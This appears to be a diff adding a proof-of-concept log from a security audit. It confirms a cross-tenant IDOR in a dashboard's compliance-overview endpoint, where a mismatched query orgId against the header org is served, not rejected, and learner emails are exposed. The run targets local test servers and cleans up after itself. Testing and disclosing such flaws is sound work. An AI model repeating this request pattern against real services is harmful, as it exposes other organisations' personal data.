@@ -1,0 +1,19 @@
+========================================================================
+VULN-014: Dashboard compliance-overview cross-org PII IDOR (authz=header, data=query orgId)
+target: API=http://localhost:21527  dashboard=http://localhost:21526
+========================================================================
+[SETUP] admin is a member of ONLY: ['48bbdff8-2ad5-46a3-a259-2ca3d52677dd']
+[STEP] seed: create a COMPLIANCE course in OUR org and enroll a student (known email)
+[SETUP] seeded compliance course 5fe4b5bb.. with student u_f3b8c648@cvehunt.local (role 3)
+[STEP] GET /dash/compliance-overview?orgId=<OUR ORG>  (header cio-org-id=OUR ORG)
+[INFO]   -> HTTP 200  totalLearners=1  emails=['u_f3b8c648@cvehunt.local']
+[PROOF] compliance-overview returned learner EMAIL u_f3b8c648@cvehunt.local in learners[].email → the endpoint exposes learner PII
+[INFO]   target f0259e1a-b93d-4f0a-ae75-1939a177e583 membership rows for admin = 0 (0 == not a member)
+[STEP] GET /dash/compliance-overview?orgId=f0259e1a-b93d-4f0a-ae75-1939a177e583  (FOREIGN real org (admin is NOT a member)); header stays OUR ORG
+[INFO]   -> HTTP 200  learners=0  emails=[]
+[PROOF] same admin (member of ONLY our org) got HTTP 200 for orgId=f0259e1a-b93d-4f0a-ae75-1939a177e583 scoped to THAT org (our seeded learner u_f3b8c648@cvehunt.local absent) → authorization is on the header org, data is on the client's query orgId; a non-member org is served, not rejected (403)
+[INFO]   contrast GET /dash/top-courses?orgId=f0259e1a-b93d-4f0a-ae75-1939a177e583 -> HTTP 200 (uses c.get('orgId'); query orgId ignored — stats.ts:128)
+==> VULN-014: CONFIRMED — compliance-overview leaks learner emails AND serves whatever org the query orgId names to a non-member (authz on header, data on query) — cross-tenant PII IDOR; harvest scales with victim data
+[OK] authorization-channel divergence + learner-email exposure confirmed
+[STEP] cleanup: deleting the seeded compliance course/group + enrollment
+[INFO]   post-cleanup group rows for seeded id = 0
